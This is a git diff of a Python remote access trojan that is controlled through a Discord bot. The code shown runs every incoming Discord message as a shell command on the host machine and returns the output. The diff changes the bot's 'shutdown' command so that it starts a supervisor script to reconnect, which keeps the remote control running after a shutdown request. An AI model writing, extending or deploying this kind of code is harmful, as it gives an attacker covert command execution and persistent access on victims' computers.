@@ -10,9 +10,9 @@ import time
 import os
 import sys
 
-DISCORD_TOKEN = "DISCORD_BOT_TOCKEN_HERE"
+DISCORD_TOKEN = "PLACE_DISCORD_BOT_TOKEN_HERE"
 
-TARGET_DIR = r"C:\Users\DiscordRAT-SAVE"
+TARGET_DIR = r"C:\Users\Discord-RAT-SAVE"
 EXE_DIR = r"C:\Users\DiscordRAT.py"
 
 GIT_DIR = os.path.join(os.getenv("LOCALAPPDATA"), "GitPortable")
@@ -233,7 +233,10 @@ async def on_message(message):
     result = execute_cmd(message.content) or f"Executed \"{message.content}\" with no output."
     
     if message.content.lower() == "shutdown":
-        await message.channel.send("RAT Bot is shutting down...")
+        await message.channel.send("Starting the supervisor script for reconnection...")
+        subprocess.Popen(["python", "DiscordRATSupervisor.py"])
+        time.sleep(1)
+        await message.channel.send("Supervisor script running, terminating session.")
         await client.close()
         return
     
@@ -267,4 +270,3 @@ async def on_message(message):
         result = result[2000:]
         
 client.run(DISCORD_TOKEN)
-
